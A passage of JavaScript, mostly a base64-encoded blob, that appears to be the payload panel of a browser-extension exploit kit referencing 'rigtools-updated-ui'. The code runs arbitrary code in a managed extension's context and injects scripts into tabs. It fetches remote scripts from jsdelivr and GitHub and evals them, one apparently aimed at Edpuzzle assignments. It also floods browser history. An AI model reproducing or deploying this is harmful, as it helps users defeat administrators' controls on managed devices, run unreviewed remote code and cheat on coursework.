J10iKSB8fAogICAgICAgICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7CiAgICAgICAgbGluay5yZWwgPSAiaWNvbiI7CiAgICAgICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChsaW5rKTsKICAgICAgICBsaW5rLmhyZWYgPQogICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vZG9jcy5pY28iOwoKICAgICAgICBsZXQgbnVtID0gcHJvbXB0KAogICAgICAgICAgICAiSG93IFRpbWVzIERvIFlvdSBXYW50IFRoaXMgUGFnZSBUbyBTaG93IFVwIEluIHlvdXIgSGlzdG9yeT8iCiAgICAgICAgKTsKICAgICAgICBsZXQgZG9uZSA9IGZhbHNlOwogICAgICAgIGNvbnN0IHggPSB3aW5kb3cubG9jYXRpb24uaHJlZjsKICAgICAgICBmb3IgKGxldCBpID0gMTsgaSA8PSBudW07IGkrKykgewogICAgICAgICAgICBoaXN0b3J5LnB1c2hTdGF0ZSgwLCAwLCBpID09PSBudW0gPyB4IDogaS50b1N0cmluZygpKTsKICAgICAgICAgICAgaWYgKGkgPT09IG51bSkgZG9uZSA9IHRydWU7CiAgICAgICAgfQogICAgICAgIGlmIChkb25lKSB7CiAgICAgICAgICAgIGFsZXJ0KAogICAgICAgICAgICAgICAgIkZsb29kaW5nIFN1Y2Nlc3NmdWwhXG4gIiArCiAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiArCiAgICAgICAgICAgICAgICAiIFxuSXMgTm93IEluIFlvdXIgSGlzdG9yeSAiICsKICAgICAgICAgICAgICAgIG51bSArCiAgICAgICAgICAgICAgICAobnVtID09IDEgPyAiIHRpbWUuIiA6ICIgVGltZXMuIikKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICB9OwoKICAgIGNvbnN0IFRhYkJ1dHRvbnMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjdGFicy1idXR0b25zIik7CgogICAgaWYgKGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQpIHsKCiAgICAgICAgZnVuY3Rpb24gbGlzdGVuZXJBcHAoY2FsbGJhY2spIHsKICAgICAgICAgICAgY29uc3QgZnVuYyA9IChpZCwgY2hhbmdlSW5mbykgPT4gewogICAgICAgICAgICAgICAgaWYgKGNoYW5nZUluZm8uc3RhdHVzID09PSAiY29tcGxldGUiKSB7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMuZ2V0KGlkLCAodGFiKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0YWIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKHRhYik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKICAgICAgICAgICAgY2hyb21lLnRhYnMub25VcGRhdGVkLmFkZExpc3RlbmVyKGZ1bmMpOwogICAgICAgICAgICByZXR1cm4gZnVuYzsKICAgICAgICB9CgogICAgICAgIGNvbnN0IHNjcmlwdHMgPSB7fTsKICAgICAgICBjb25zdCBjb25kaXRpb25zID0ge307CiAgICAgICAgY29uc3QgbGlzdGVuZXJzID0ge307CgogICAgICAgIHNjcmlwdHMuZXJ1ZGEgPSBgCiAgICBmZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9lcnVkYSIpLnRoZW4ocmVzID0+IHJlcy50ZXh0KCkpLnRoZW4oKGRhdGEpID0+IHsKICAgICAgZXZhbChkYXRhKTsKICAgICAgaWYgKCF3aW5kb3cuZXJ1ZGFMb2FkZWQpIHsKICAgICAgICBlcnVkYS5pbml0KHsKICAgICAgICAgIGRlZmF1bHRzOiB7CiAgICAgICAgICAgIGRpc3BsYXlTaXplOiA0NSwKICAgICAgICAgICAgdGhlbWU6ICJBTU9MRUQiCiAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93LmVydWRhTG9hZGVkID0gdHJ1ZTsKICAgICAgfQogICAgfSk7CiAgYDsKCiAgICAgICAgc2NyaXB0cy5jaGlpID0gYAogICAgY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICBzY3JpcHQuc3JjID0gJ2h0dHBzOi8vY2hpaS5saXJpbGlyaS5pby9wbGF5Z3JvdW5kL3RhcmdldC5qcyc7CiAgICBzY3JpcHQuc2V0QXR0cmlidXRlKCdlbWJlZGRlZCcsICd0cnVlJyk7CiAgICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CiAgYDsKCiAgICAgICAgc2NyaXB0cy5hZGJsb2NrID0gYAogICAgKGZ1bmN0aW9uKCl7CgogICAgICB2YXIgc2VsZWN0b3JzID0gWwoKICAgICAgJyNzaWRlYmFyLXdyYXAnLCAnI2FkdmVydCcsICcjeHJhaWwnLCAnI21pZGRsZS1hcnRpY2xlLWFkdmVydC1jb250YWluZXInLAogICAgICAnI3Nwb25zb3JlZC1yZWNvbW1lbmRhdGlvbnMnLCAnI2Fyb3VuZC10aGUtd2ViJywgJyNzcG9uc29yZWQtcmVjb21tZW5kYXRpb25zJywKICAgICAgJyN0YWJvb2xhLWNvbnRlbnQnLCAnI3RhYm9vbGEtYmVsb3ctdGFib29sYS1uYXRpdmUtdGh1bWJuYWlscycsICcjaW5hcnRpY2xlX3dyYXBwZXJfZGl2JywKICAgICAgJyNyYy1yb3ctY29udGFpbmVyJywgJyNhZHMnLCAnI2F0LXNoYXJlLWRvY2snLCAnI2F0NC1zaGFyZScsICcjYXQ0LWZvbGxvdycsICcjcmlnaHQtYWRzLXJhaWwnLAogICAgICAnZGl2I2FkLWludGVyc3RpdGlhbCcsICdkaXYjYWR2ZXJ0LWFydGljbGUnLCAnZGl2I2FjLWxyZS1wbGF5ZXItcGgnLAoKICAgICAgJy5hZCcsICcuYXZlcnQnLCAnLmF2ZXJ0X193cmFwcGVyJywgJy5taWRkbGUtYmFubmVyLWFkJywgJy5hZHZlcnRpc2VtZW50JywKICAgICAgJy5Hb29nbGVBY3RpdmVWaWV3Q2xhc3MnLCAnLmFkdmVydCcsICcuY25zLWFkcy1zdGFnZScsICcudGVhZHMtaW5yZWFkJywgJy5hZC1iYW5uZXInLAogICAgICAnLmFkLWFuY2hvcmVkJywgJy5qc19zaGVsZl9hZHMnLCAnLmFkLXNsb3QnLCAnLmFudGVubmEnLCAnLnhyYWlsLWNvbnRlbnQnLAogICAgICAnLmFkdmVydGlzZW1lbnRfX2xlYWRlcmJvYXJkJywgJy5hZC1sZWFkZXJib2FyZCcsICcudHJjX3Jib3hfb3V0ZXInLCAnLmtzLXJlY29tbWVuZGVkJywKICAgICAgJy5hcnRpY2xlLWRhJywgJ2Rpdi5zcG9uc29yZWQtc3Rvcmllcy1jb21wb25lbnQnLCAnZGl2LmFkZHRoaXMtc21hcnRsYXllcnMnLAogICAgICAnZGl2LmFydGljbGUtYWRzcG9uc29yJywgJ2Rpdi5zaWduaW4tcHJvbXB0JywgJ2Rpdi5hcnRpY2xlLWJ1bXBlcicsICdkaXYudmlkZW8tcGxhY2Vob2xkZXInLAogICAgICAnZGl2LnRvcC1hZC1jb250YWluZXInLCAnZGl2LmhlYWRlci1hZCcsICdkaXYuYWQtdW5pdCcsICdkaXYuZGVtby1ibG9jaycsICdkaXYuT1VUQlJBSU4nLAogICAgICAnZGl2Lm9iLXdpZGdldCcsICdkaXYubndzcm0td3JhcHBlcicsICdkaXYuYW5ub3VuY2VtZW50QmFyJywgJ2Rpdi5wYXJ0bmVyLXJlc291cmNlcy1ibG9jaycsCiAgICAgICdkaXYuYXJyb3ctZG93bicsICdkaXYubS1hZCcsICdkaXYuc3RvcnktaW50ZXJydXB0JywgJ2Rpdi50YWJvb2xhLXJlY29tbWVuZGVkJywKICAgICAgJ2Rpdi5hZC1jbHVzdGVyLWNvbnRhaW5lcicsICdkaXYuY3R4LXNpZGViYXInLCAnZGl2LmluY29nbml0by1tb2RhbCcsICcuT1VUQlJBSU4nLCAnLnN1YnNjcmliZS1idXR0b24nLAogICAgICAnLmFkczknLCAnLmxlYWRlcmJvYXJkcycsICcuR29vZ2xlQWN0aXZlVmlld0VsZW1lbnQnLCAnLm1wdS1jb250YWluZXInLCAnLmFkLTMwMHg2MDAnLCAnLnRmLWFkLWJsb2NrJywKICAgICAgJy5zaWRlYmFyLWFkcy1ob2xkZXItdG9wJywgJy5hZHMtb25lJywgJy5GdWxsUGFnZU1vZGFsX19zY3JvbGxlcicsCiAgICAgICcuY29udGVudC1hZHMtaG9sZGVyJywgJy53aWRnZXQtYXJlYScsICcuc29jaWFsLWJ1dHRvbnMnLCAnLmFjLXBsYXllci1waCcsCgogICAgICAnYXNpZGUjc3BvbnNvcmVkLXJlY29tbWVuZGF0aW9ucycsICdhc2lkZVtyb2xlPSJiYW5uZXIiXScsICdhc2lkZScsCiAgICAgICdhbXAtYWQnLCAnc3BhbltpZF49YWRfaXNfXScsICdkaXZbY2xhc3MqPSJpbmRpYW5hcG9saXMtb3B0aW4iXScsICdkaXZbaWRePWdvb2dsZV9hZHNfaWZyYW1lXScsCiAgICAgICdkaXZbZGF0YS1nb29nbGUtcXVlcnktaWRdJywgJ3NlY3Rpb25bZGF0YS1yZXNwb25zZV0nLCAnaW5zLmFkc2J5Z29vZ2xlJywgJ2RpdltkYXRhLWdvb2dsZS1xdWVyeS1pZF0nLAogICAgICAnZGl2W2RhdGEtdGVzdC1pZD0iZnVsbFBhZ2VTaWdudXBNb2RhbCJdJywgJ2RpdltkYXRhLXRlc3QtaWQ9ImdpZnRXcmFwIl0nIF07CiAgICAgIGZvcihsZXQgaSBpbiBzZWxlY3RvcnMpIHsKICAgICAgICAgIGxldCBub2Rlc0xpc3QgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKHNlbGVjdG9yc1tpXSk7CiAgICAgICAgICBmb3IobGV0IGkgPSAwOyBpIDwgbm9kZXNMaXN0Lmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgbGV0IGVsID0gbm9kZXNMaXN0W2ldOwogICAgICAgICAgICAgIGlmKGVsICYmIGVsLnBhcmVudE5vZGUpCiAgICAgICAgICAgICAgZWwucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChlbCk7CiAgICAgICAgICB9CiAgICAgIH0KICAgIH0pKCk7CiAgYDsKICAvKnNjcmlwdHMuZ2xvY2tlZCA9IGAKZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94TmFzdW5pL2dvb2dsZS1mb3Jtcy11bmxvY2tlci9yZWZzL2hlYWRzL21haW4vc2NyaXB0LmpzIikKICAudGhlbihyZXNwb25zZSA9PiB7CiAgICBpZiAoIXJlc3BvbnNlLm9rKSB7CiAgICAgIHRocm93IG5ldyBFcnJvcigiTmV0d29yayByZXNwb25zZSB3YXMgbm90IG9rIik7CiAgICB9CiAgICByZXR1cm4gcmVzcG9uc2UudGV4dCgpOwogIH0pCiAgLnRoZW4oc2NyaXB0Q29udGVudCA9PiB7CiAgICBpZiAoIXdpbmRvdy5za2liTG9hZGVkKSB7CiAgICAgIGV2YWwoc2NyaXB0Q29udGVudCk7CiAgICAgIHdpbmRvdy5za2liTG9hZGVkID0gdHJ1ZTsKICAgIH0KICB9KQogIC5jYXRjaChlcnJvciA9PiBhbGVydCgiRXJyb3IgbG9hZGluZyBzY3JpcHQ6IiwgZXJyb3IpKTsKYDsKKi8KICAgICAgICBzY3JpcHRzLmVkcHV6emxlID0gYAogICAgZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9NaW5lcjQ5dXIvc2hvcnRoYW5kQG1haW4vZWRwdXp6bGluZ3NjcmlwdC5qcyIpLnRoZW4ociA9PiByLnRleHQoKSkudGhlbihyID0+IHsKICAgICAgaWYgKCF3aW5kb3cuZWRwdXp6bGVzTG9hZGVkKSB7CiAgICAgICAgZXZhbChyKTsKICAgICAgICB3aW5kb3cuZWRwdXp6bGVzTG9hZGVkID0gdHJ1ZTsKICAgICAgfQogICAgfSk7CiAgYDsKICAgICAgICBjb25kaXRpb25zLmVkcHV6emxlID0gKHRhYikgPT4gdGFiLnVybC5tYXRjaCgvZWRwdXp6bGVcLmNvbVwvYXNzaWdubWVudHMvZyk7CiAgICAgICAgLy8gY29uZGl0aW9ucy5nbG9ja2VkID0gKHRhYikgPT4gdGFiLnVybC5tYXRjaCgvaHR0cHM/OlwvXC9kb2NzXC5nb29nbGVcLmNvbVwvZm9ybXNcLy9nKTsKICAgICAgICBjb25zdCBUb2dnbGVCdXR0b25zID0gVGFiQnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlYWJsZS1idXR0b25zIik7CgogICAgICAgIFRvZ2dsZUJ1dHRvbnMucXVlcnlTZWxlY3RvckFsbCgiYnV0dG9uIikuZm9yRWFjaCgKICAgICAgICAgICAgKGIpID0+CiAgICAgICAgICAgIChiLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCBpZCA9IGIuaWQ7CgogICAgICAgICAgICAgICAgaWYgKGIuaGFzQXR0cmlidXRlKCJ0b2dnbGVkIikpIHsKCiAgICAgICAgICAgICAgICAgICAgaWYgKGlkIGluIGxpc3RlbmVycykKICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMub25VcGRhdGVkLnJlbW92ZUxpc3RlbmVyKGxpc3RlbmVyc1tpZF0pOwogICAgICAgICAgICAgICAgICAgIGIucmVtb3ZlQXR0cmlidXRlKCJ0b2dnbGVkIik7CiAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICBjb25zdCBzY3JpcHQgPSBzY3JpcHRzW2lkXSB8fCAiIjsKICAgICAgICAgICAgICAgICAgICBjb25zdCBjb25kaXRpb24gPSBjb25kaXRpb25zW2lkXSB8fCAoKHRhYikgPT4gdHJ1ZSk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZnVuYyA9IGxpc3RlbmVyQXBwKCh0YWIpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbmRpdGlvbih0YWIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KHRhYi5pZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvZGU6IHNjcmlwdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgbGlzdGVuZXJzW2lkXSA9IGZ1bmM7CgogICAgICAgICAgICAgICAgICAgIGIuc2V0QXR0cmlidXRlKCJ0b2dnbGVkIiwgInRydWUiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkKICAgICAgICApOwogICAgfSBlbHNlIHsKICAgICAgICBUYWJCdXR0b25zLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9CgogICAgZG9jdW1lbnQKICAgICAgICAucXVlcnlTZWxlY3RvcigiI2NvZGUtcnVuIikKICAgICAgICAuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiBydW5Db2RlKGZhbHNlKSk7Cn07Cgpjb25zdCBydW5Db2RlID0gYXN5bmMgKG9uVGFiLCB0YWJJZCA9ICIiKSA9PiB7CiAgICBjb25zdCBjb2RlVGV4dGFyZWEgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjY29kZSIpOwogICAgbGV0IGNvZGUgPSBjb2RlVGV4dGFyZWEudmFsdWUudHJpbSgpOwoKICAgIGNvbnN0IG91dHB1dERpdiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlLW91dHB1dCIpOwoKICAgIGlmIChjb2RlLnRvTG93ZXJDYXNlKCkgPT09ICJwcmFoaXQiKSB7CgogICAgICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIGNvbnRhaW5lci5jbGFzc05hbWUgPSAicHJhaGl0LWNvbnRhaW5lciI7CgogICAgICAgIGNvbnN0IG92ZXJsYXlJbWFnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgICAgIG92ZXJsYXlJbWFnZS5zcmMgPQogICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL3ByYWhpdC5wbmciOwogICAgICAgIG92ZXJsYXlJbWFnZS5hbHQgPSAiUHJhaGl0IEltYWdlIjsKICAgICAgICBvdmVybGF5SW1hZ2UuY2xhc3NOYW1lID0gInByYWhpdC1pbWFnZSI7CgogICAgICAgIGNvbnN0IHRleHRCb3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICB0ZXh0Qm94LnRleHRDb250ZW50ID0gIlwiSSBtYWRlIG15IG93biBvaWwgcmlnZ2luZyBzdG9jayBtYXJrZXQgdG9vbHMuXCIiOwogICAgICAgIHRleHRCb3guY2xhc3NOYW1lID0gInByYWhpdC10ZXh0Ym94IjsKCiAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKG92ZXJsYXlJbWFnZSk7CiAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKHRleHRCb3gpOwoKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRhaW5lcik7CgogICAgICAgIGNvbnN0IHNub3dmbGFrZXNEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICBzbm93Zmxha2VzRGl2LmNsYXNzTmFtZSA9ICJzbm93Zmxha2VzIjsKICAgICAgICBzbm93Zmxha2VzRGl2LnNldEF0dHJpYnV0ZSgiYXJpYS1oaWRkZW4iLCAidHJ1ZSIpOwoKICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IDE0OyBpKyspIHsKICAgICAgICAgICAgY29uc3Qgc25vd2ZsYWtlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgICAgIHNub3dmbGFrZS5jbGFzc05hbWUgPSAic25vd2ZsYWtlIjsKCiAgICAgICAgICAgIGNvbnN0IHNub3dmbGFrZUltYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICAgICAgICAgIHNub3dmbGFrZUltYWdlLndpZHRoID0gMzA7CiAgICAgICAgICAgIHNub3dmbGFrZUltYWdlLnNyYyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvcHJhaGl0LnBuZyI7CiAgICAgICAgICAgIHNub3dmbGFrZS5hcHBlbmRDaGlsZChzbm93Zmxha2VJbWFnZSk7CgogICAgICAgICAgICBzbm93Zmxha2VzRGl2LmFwcGVuZENoaWxkKHNub3dmbGFrZSk7CiAgICAgICAgfQoKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNub3dmbGFrZXNEaXYpOwoKICAgICAgICBjb25zdCBleHBsb3Npb25JbWFnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnNyYyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvYm9vbS5hd2VicCI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLnRvcCA9ICIwIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5sZWZ0ID0gIjAiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGV4cGxvc2lvbkltYWdlKTsKCiAgICAgICAgY29uc3QgZXhwbG9kZSA9IG5ldyBBdWRpbygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL2Jvb20ubXAzIik7CgogICAgICAgIGNvbnN0IGNhdHNNdXNpYyA9IG5ldyBBdWRpbygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL2NhdHMubXAzIik7CiAgICAgICAgY2F0c011c2ljLmxvb3AgPSB0cnVlOwoKICAgICAgICBmdW5jdGlvbiBzaG93RXhwbG9zaW9uQW5kUGxheU11c2ljKCkgewoKICAgICAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7CgogICAgICAgICAgICBleHBsb2RlLnBsYXkoKTsKICAgICAgICAgICAgY2F0c011c2ljLnBsYXkoKTsKCiAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgICAgICB9LCAxNTAwKTsKCiAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBleHBsb2RlLnBhdXNlKCk7CiAgICAgICAgICAgICAgICBleHBsb2RlLmN1cnJlbnRUaW1lID0gMDsKICAgICAgICAgICAgfSwgMTUwMCk7CiAgICAgICAgfQoKICAgICAgICBzaG93RXhwbG9zaW9uQW5kUGxheU11c2ljKCk7CgogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBpZiAob25UYWIpIHsKICAgICAgICBjb2RlID0gY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCA/CiAgICAgICAgICAgIGA7Y2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCgKICAgICAgICAgICR7dGFiSWR9LAogICAgICAgICAgeyBjb2RlOiAke0pTT04uc3RyaW5naWZ5KGNvZGUpfSB9CiAgICAgICAgKWAgOgogICAgICAgICAgICBjaHJvbWUuc2NyaXB0aW5nID8KICAgICAgICAgICAgYGNocm9tZS5zY3JpcHRpbmcuZXhlY3V0ZVNjcmlwdCh7CiAgICAgICAgICB0YXJnZXQ6IHt0YWJJZDogJHt0YWJJZH19LAogICAgICAgICAgZnVuYzogKCkgPT4geyR7Y29kZX19CiAgICAgICAgfSk7YCA6CiAgICAgICAgICAgIGBhbGVydCgic29tZXRoaW5nIHdlbnQgd3JvbmcsIHJ1bkNvZGUgd2FzIGV4ZWN1dGVkIG9uIGEgdGFiIHdpdGhvdXQgcHJvcGVyIHBlcm1pc3Npb25zIilgOwogICAgfQoKICAgIHRyeSB7CiAgICAgICAgY29uc3Qgb3JpZ2luYWxMb2cgPSBjb25zb2xlLmxvZzsKICAgICAgICBjb25zb2xlLmxvZyA9ICguLi5hcmdzKSA9PiB7CiAgICAgICAgICAgIG91dHB1dERpdi5pbm5lckhUTUwgKz0gYXJncy5qb2luKCIgIikgKyAiPGJyPiI7CiAgICAgICAgfTsKCiAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CgogICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbih3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoInNyYy5qcyIsIGNvZGUpOwogICAgICAgIGxldCBzY3JpcHQgPQogICAgICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNldmFsdWF0ZV9lbGVtIikgPz8KICAgICAgICAgICAgZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LnJlbW92ZSgpOwogICAgICAgIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5pZCA9ICJldmFsdWF0ZV9lbGVtIjsKICAgICAgICBzY3JpcHQuc3JjID0gdXJsOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKCiAgICAgICAgY29uc29sZS5sb2cgPSBvcmlnaW5hbExvZzsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgb3V0cHV0RGl2LmlubmVySFRNTCA9IGBFcnJvcjogJHtlcnJvcn1gOwogICAgfQp9Owo=`))\n                  const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+CiAgICA8dGl0bGU+VW50aXRsZWQgRG9jdW1lbnQ8L3RpdGxlPgogICAgPGxpbmsKICAgICAgcmVsPSJpY29uIgogICAgICB0eXBlPSJpbWFnZS94LWljb24iCiAgICAgIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL3JpZ3Rvb2xzLWJvdW5jZS5naWYiCiAgICAvPgogIDwvaGVhZD4KCiAgPGJvZHkgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6IGJsYWNrOyBjb2xvcjogd2hpdGU7Ij4KICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtZ3JpZCI+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJtYWluIj4KICAgICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgICA8cD4KICAgICAgICBObyBwYXlsb2FkcyBjdXJyZW50bHkgYXZhaWxhYmxlIGZvciB5b3VyIGV4dGVuc2lvbi4gVHJ5IGFub3RoZXIKICAgICAgICBleHRlbnNpb24uIFdlIGFyZSBjdXJyZW50bHkgZGV2ZWxvcGluZyBwYXlsb2FkcyBmb3Igb3RoZXIgQVBJcy4KICAgICAgPC9wPgogICAgICA8cD5BdmFpbGFibGUgcGF5bG9hZHMgZm9yIHBlcm1pc3Npb25zOjwvcD4KICAgICAgPHVsPgogICAgICAgIDxsaT5tYW5hZ2VtZW50PC9saT4KICAgICAgICA8bGk+RGVmYXVsdDwvbGk+CiAgICAgIDwvdWw+CiAgICA8L2Rpdj4KICA8L2JvZHk+CjwvaHRtbD4K')}<script src=\"./index.js\" ></script>`);\n                  w.chrome.tabs.create({ url });\n                  w.close();\n                  cleanup();\n              });\n          \n          }\n          document.open();\n          document.write(atob(``));\n          